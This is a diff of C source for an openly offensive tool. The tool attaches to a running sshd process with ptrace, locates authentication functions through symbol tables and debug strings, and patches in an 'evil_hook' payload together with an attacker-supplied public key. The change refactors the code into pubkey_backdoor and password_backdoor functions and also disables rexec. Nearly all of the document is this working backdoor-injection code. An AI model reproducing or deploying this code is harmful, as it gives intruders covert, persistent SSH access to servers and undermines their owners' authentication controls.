@@ -24,258 +24,46 @@ int dynsym_sz, dynstr_sz;
 u8 *symtab, *strtab;
 int symtab_sz, strtab_sz;
 
-signature signatures[]={
-	{ 0x7777777788888888, "key_allowed", "trying public key file %s", 0 },
-	{ 0xaaaaaaaabbbbbbbb, "key_new"    , "key_new: RSA_new failed"  , 0 },
-	{ 0x1111111122222222, "key_read"   , "key_read: type mismatch: ", 0 },
-	{ 0x3333333344444444, "key_equal"  , "key_equal: bad"           , 0 },
-	{ 0x5555555566666666, "key_free"   , "key_free: "               , 0 },
-	{ 0x99999999aaaaaaaa, "restore_uid", "restore_uid: %u/%u"       , 0 },
-};
+u64 resolve_symbol_tab(inject_ctx *ctx, char *name) {
+	u64 sym;
 
-#define LEA_RDI 0x3d
-#define LEA_RAX 0x05
-
-u64 lea_by_debugstr(inject_ctx *ctx, u8 lea_reg, char *str) {
-	u64 lea_addr, str_addr;
-	char leabuf[]="\x48\x8d\x00\x00\x00\x00\x00";
-	int *rptr = (int*)&leabuf[3];
-	int i, j;
-	mem_mapping *mapping;
-
-	leabuf[2] = lea_reg;
-
-	str_addr = find_sig_mem(ctx, (u8*)str, strlen(str), MEM_R);
-
-	if (str_addr == 0)
-		error("could not locate str '%s'", str);
-
-	for(i = 0; i < ctx->num_maps; i++) {
-		mapping = ctx->mappings[i];
-
-		if ((mapping->perm & (MEM_R | MEM_X)) != (MEM_R | MEM_X))
-			continue;
-
-		for(j = 0; j < mapping->size-7; j++) {
-			*rptr = str_addr - (mapping->start+j+7);
-			if (memcmp(mapping->data+j, leabuf, 7) == 0) {
-				lea_addr = mapping->start+j;
-			}
-		}
+	if (dynsym != 0 && dynstr != 0) {
+		sym = resolve_symbol(dynsym, dynsym_sz, (char*)dynstr, name);
 	}
 
-	return lea_addr;
-}
-
-u64 find_prev_lea(inject_ctx *ctx, u8 lea_reg, u64 start_addr, u64 lea_addr) {
-	int i, j;
-	mem_mapping *mapping;
-	char leabuf[]="\x48\x8d\x00\x00\x00\x00\x00";
-	int *rptr = (int*)&leabuf[3];
-
-	leabuf[2] = lea_reg;
-
-	for(i = 0; i < ctx->num_maps; i++) {
-		mapping = ctx->mappings[i];
-
-		if (!(start_addr >= mapping->start && start_addr <= mapping->end))
-			continue;
-
-		for(j = (start_addr - 7 - mapping->start); j > 0; j--) {
-			*rptr = lea_addr - (mapping->start+j+7);
-
-			if (memcmp(mapping->data+j, leabuf, 7) == 0) {
-				return mapping->start+j;
-			}
-		}
+	if (sym == 0 && symtab != 0 && strtab != 0) {
+		sym = resolve_symbol(symtab, symtab_sz, (char*)strtab, name);
 	}
 
-	return 0;
-}
-
-u64 find_next_opcode(inject_ctx *ctx, u64 start_addr, u8 *sig, u8 siglen) {
-	int i, j;
-	mem_mapping *mapping;
-
-	for(i = 0; i < ctx->num_maps; i++) {
-		mapping = ctx->mappings[i];
-
-		if (!(start_addr >= mapping->start && start_addr <= mapping->end))
-			continue;
-
-		for(j = start_addr - mapping->start; j < mapping->size - siglen; j++) {
-			if (memcmp(mapping->data+j, sig, siglen) == 0) {
-				return mapping->start+j;
-			}
-		}
+	if (sym != 0) {
+		sym += ctx->elf_base;
 	}
 
-	return 0;
+	return sym;
 }
 
-u64 sub_by_debugstr(inject_ctx *ctx, char *str) {
-	u64 lea_addr = 0, rdiff=0, rtop=0;
-	callcache_entry *callcache, *entry;
-	u32 callcache_total;
-	int i;
 
-	callcache = get_callcache();
-	callcache_total = get_callcachetotal();
+void pubkey_backdoor(inject_ctx *ctx, char *pubkey) {
+	signature signatures[]={
+		{ 0x7777777788888888, "key_allowed", "trying public key file %s", 0 },
+		{ 0xaaaaaaaabbbbbbbb, "key_new"    , "key_new: RSA_new failed"  , 0 },
+		{ 0x1111111122222222, "key_read"   , "key_read: type mismatch: ", 0 },
+		{ 0x3333333344444444, "key_equal"  , "key_equal: bad"           , 0 },
+		{ 0x5555555566666666, "key_free"   , "key_free: "               , 0 },
+		{ 0x99999999aaaaaaaa, "restore_uid", "restore_uid: %u/%u"       , 0 },
+	};
 
-	lea_addr = lea_by_debugstr(ctx, LEA_RDI, str);
-
-	if (lea_addr == 0) 
-		error("could not find 'lea' insn for str '%s'", str);
-
-	rdiff=0x313337;
-	rtop=0;
-
-	for(i=0; i<callcache_total; i++) {
-		entry = &callcache[i];
-		if (entry->dest < lea_addr) {
-			if (lea_addr - entry->dest < rdiff) {
-				rdiff = lea_addr - entry->dest;
-				rtop = entry->dest;
-			}
-		}
-	}
-
-	return rtop;
-}
-
-u64 resolve_call_insn(inject_ctx *ctx, u64 call_insn_addr) {
-	u8 opcode;
-	u32 call;
-
-	_peek(ctx->pid, call_insn_addr, &opcode, 1);
-
-	if (opcode != 0xe8)
-		return 0;
-
-	_peek(ctx->pid, call_insn_addr+1, &call, 4);
-
-	return call_insn_addr + 5 + call;
-}
-
-int main(int argc, char *argv[]) {
-	char line[255], sshd_path[255], proc_exe[64];
-	int i, j;
-
-	char rdibuf[]="\x48\x8d\x3d\x00\x00\x00\x00";
-	int *rptr = (int*)&rdibuf[3];
-
-	u32 nullw=0, callcache_total;
-	callcache_entry *callcache, *entry;
-	u64 diff=0, hole_addr=0, rexec_flag;
-	u64 user_key_allowed2_calls[MAX_KEY_ALLOWED_CALLS];
-	u64 use_privsep=0, logit_passchange=0, privsep_lea=0, privsep_test=0;
-	u64 auth_password=0, mm_auth_password=0;
-	u32 num_key_allowed2_calls=0;
 	u8 *evil_bin;
-	u8 privsep_jnz[2]={0,0};
-
+	int i, j;
+	u32 callcache_total, num_key_allowed2_calls=0;
+	char line[255];
+	callcache_entry *callcache, *entry;
+	u64 user_key_allowed2_calls[MAX_KEY_ALLOWED_CALLS];
+	u64 diff=0, hole_addr=0;
 	mem_mapping *m1, *m2;
-
-	if (argc != 3) {
-		fprintf(stderr, "usage: %s <pid>\n", argv[0]);
-		return -1;
-	}
-
-	inject_ctx *ctx = malloc(sizeof(inject_ctx));
-
-	ctx->pid     = atoi(argv[1]);
-
-	_attach(ctx->pid);
-	info("slurping stuff to memory..");
-	map_init();
-	ctx->num_maps = map_load_all(ctx);
-	info("loaded %d memory mappings", ctx->num_maps);
 
 	evil_bin = malloc(evil_hook_size);
 	memcpy(evil_bin, evil_hook, evil_hook_size);
-
-	ctx->mappings = get_mappings();
-
-	sort_maps(ctx);
-
-	memset(sshd_path, 0, 255);
-	sprintf(proc_exe, "/proc/%d/exe", atoi(argv[1]));
-	readlink(proc_exe, sshd_path, 255);
-
-	info("sshd binary path = '%s'", sshd_path);
-
-	// locate syscall instruction
-	ctx->sc_addr = find_sig_mem(ctx, (u8*)"\x0f\x05", 2, MEM_R | MEM_X);
-	info("syscall\t\t= \x1b[37m0x%lx", ctx->sc_addr);
-
-	// lookup 'rexec_flag' through dynsym/symtab
-	dynsym_sz = get_section(sshd_path, ".dynsym", &dynsym);
-	dynstr_sz = get_section(sshd_path, ".dynstr", &dynstr);
-
-	if (dynsym == 0 || dynstr == 0)
-		error("could not find dynsym.\n");
-
-	// oboi, what a mess
-	use_privsep = ctx->elf_base + resolve_symbol(dynsym, dynsym_sz, (char*)dynstr, "use_privsep");
-	
-	// If dynsym lookup failed, try symtab
-	if (use_privsep == ctx->elf_base) {
-		symtab_sz = get_section(sshd_path, ".symtab", &symtab);
-		strtab_sz = get_section(sshd_path, ".strtab", &strtab);
-		
-		if (symtab == 0 || strtab == 0)
-			error("could not find symtab.\n");
-
-		use_privsep = ctx->elf_base + resolve_symbol(symtab, symtab_sz, (char*)strtab, "use_privsep");
-	}
-	
-	info("found use_privsep\t\t= 0x%llx", use_privsep);
-
-	logit_passchange = lea_by_debugstr(ctx, LEA_RDI, "password change not supported");
-	info("logit(\"password change..\") = 0x%llx", logit_passchange);
-
-	privsep_lea = find_prev_lea(ctx, LEA_RAX, logit_passchange, use_privsep);
-	info("lea rax, privsep\t\t= 0x%llx", privsep_lea);
-
-	privsep_test = find_next_opcode(ctx, privsep_lea, "\x85\xc0", 2);
-	info("privsep test\t\t= 0x%llx", privsep_test);
-
-	_peek(ctx->pid, privsep_test+2, privsep_jnz, 2);
-
-	if (privsep_jnz[0] != 0x75) {
-		error("wtf du0d.. the next insn is not a jnz.. wtf..");
-		return -1;
-	}
-
-	auth_password = resolve_call_insn(ctx, privsep_test+4);
-	info("auth_password\t\t= 0x%llx", auth_password);
-
-	mm_auth_password = resolve_call_insn(ctx, privsep_test+4+privsep_jnz[1]);
-	info("mm_auth_password\t\t= 0x%llx", mm_auth_password);
-	
-
-	// deal with rexec
-	rexec_flag = ctx->elf_base + resolve_symbol(dynsym, dynsym_sz, (char*)dynstr, "rexec_flag");
-
-	if (rexec_flag == ctx->elf_base) {
-		info("could not resolve rexec_flag through dynsym.. trying symtab!");
-
-		symtab_sz = get_section(sshd_path, ".symtab", &symtab);
-		strtab_sz = get_section(sshd_path, ".strtab", &strtab);
-
-		if (symtab == 0 || strtab == 0)
-			error("could not find symtab.\n");
-
-		rexec_flag = ctx->elf_base + resolve_symbol(symtab, symtab_sz, (char*)strtab, "rexec_flag");
-
-		if (rexec_flag == ctx->elf_base) {
-			error("could not resolve rexec_flag through symtab EITHER :((");
-		}
-	}
-
-	info("rexec_flag\t\t= 0x%lx", rexec_flag); 
-
-	cache_calltable(ctx);
 
 	for(i = 0; i < sizeof(signatures) / sizeof(signature); i++) {
 		signatures[i].addr = sub_by_debugstr(ctx, signatures[i].str);
@@ -283,7 +71,10 @@ int main(int argc, char *argv[]) {
 			error("%s not found :(\n", signatures[i].name);
 		}
 
-		sprintf(line, "%s\t\t= \x1b[37m0x%lx", signatures[i].name, signatures[i].addr);
+		sprintf(line, 
+			"%s\t\t= \x1b[37m0x%lx",
+			signatures[i].name, signatures[i].addr
+		);
 
 		for(j = 0; j < evil_hook_size - 8; j++) {
 			u64 *vptr = (u64*)&evil_bin[j];
@@ -346,9 +137,6 @@ int main(int argc, char *argv[]) {
 		0, 0
 	);
 
-	info("switching off rexec..");
-	_poke(ctx->pid, rexec_flag, &nullw, 4);
-
 	for(i=0; i<num_key_allowed2_calls; i++) {
 		diff = 0x100000000-(user_key_allowed2_calls[i]-hole_addr)-5;
 
@@ -362,8 +150,109 @@ int main(int argc, char *argv[]) {
 	}
 
 	_poke(ctx->pid, hole_addr, evil_bin, evil_hook_size);
-	_poke(ctx->pid, hole_addr+(evil_hook_size), argv[2], strlen(argv[2]));
+	_poke(ctx->pid, hole_addr+(evil_hook_size), pubkey, strlen(pubkey));
 	info("poked evil_bin to 0x%lx.", hole_addr);
+	
+}
+
+void password_backdoor(inject_ctx *ctx) {
+	u8 privsep_jnz[2]={0,0};
+
+	u64 use_privsep=0, logit_passchange=0, privsep_lea=0, privsep_test=0;
+	u64 auth_password=0, mm_auth_password=0;
+
+	use_privsep = resolve_symbol_tab(ctx, "use_privsep");
+
+	if (use_privsep == 0) {
+		error("could not locate use_privsep :(");
+	}
+
+	info("found use_privsep\t\t= 0x%llx", use_privsep);
+
+	logit_passchange = lea_by_debugstr(
+		ctx, LEA_RDI, "password change not supported"
+	);
+
+	info("logit(\"password change..\") = 0x%llx", logit_passchange);
+
+	privsep_lea = find_prev_lea(ctx, LEA_RAX, logit_passchange, use_privsep);
+	info("lea rax, privsep\t\t= 0x%llx", privsep_lea);
+
+	privsep_test = find_next_opcode(ctx, privsep_lea, (u8*)"\x85\xc0", 2);
+	info("privsep test\t\t= 0x%llx", privsep_test);
+
+	_peek(ctx->pid, privsep_test+2, privsep_jnz, 2);
+
+	if (privsep_jnz[0] != 0x75) {
+		error("wtf du0d.. the next insn is not a jnz.. wtf..");
+		exit(-1);
+	}
+
+	auth_password = resolve_call_insn(ctx, privsep_test+4);
+	info("auth_password\t\t= 0x%llx", auth_password);
+
+	mm_auth_password = resolve_call_insn(ctx, privsep_test+4+privsep_jnz[1]);
+	info("mm_auth_password\t\t= 0x%llx", mm_auth_password);
+}
+
+int main(int argc, char *argv[]) {
+	char sshd_path[255], proc_exe[64];
+
+	u32 nullw=0;
+	u64 rexec_flag = 0;
+
+	if (argc != 3) {
+		fprintf(stderr, "usage: %s <pid>\n", argv[0]);
+		return -1;
+	}
+
+	inject_ctx *ctx = malloc(sizeof(inject_ctx));
+
+	ctx->pid = atoi(argv[1]);
+
+	_attach(ctx->pid);
+	info("slurping stuff to memory..");
+	map_init();
+	ctx->num_maps = map_load_all(ctx);
+	info("loaded %d memory mappings", ctx->num_maps);
+
+	ctx->mappings = get_mappings();
+
+	sort_maps(ctx);
+
+	memset(sshd_path, 0, 255);
+	sprintf(proc_exe, "/proc/%d/exe", atoi(argv[1]));
+	readlink(proc_exe, sshd_path, 255);
+
+	info("sshd binary path = '%s'", sshd_path);
+
+	// locate syscall instruction
+	ctx->sc_addr = find_sig_mem(ctx, (u8*)"\x0f\x05", 2, MEM_R | MEM_X);
+	info("syscall\t\t= \x1b[37m0x%lx", ctx->sc_addr);
+
+	// load symtabs
+	dynsym_sz = get_section(sshd_path, ".dynsym", &dynsym);
+	dynstr_sz = get_section(sshd_path, ".dynstr", &dynstr);
+
+	symtab_sz = get_section(sshd_path, ".symtab", &symtab);
+	strtab_sz = get_section(sshd_path, ".strtab", &strtab);
+
+	// find rexec_flag
+	rexec_flag = resolve_symbol_tab(ctx, "rexec_flag");
+
+	if (rexec_flag == 0) {
+		error("could not resolve rexec_flag :(");
+	}
+
+	info("rexec_flag\t\t= 0x%lx", rexec_flag); 
+
+	cache_calltable(ctx);
+
+	//password_backdoor(ctx);
+	pubkey_backdoor(ctx, argv[2]);
+
+	info("switching off rexec..");
+	_poke(ctx->pid, rexec_flag, &nullw, 4);
 
 	_detach(ctx->pid);
 	info("detached.\n");
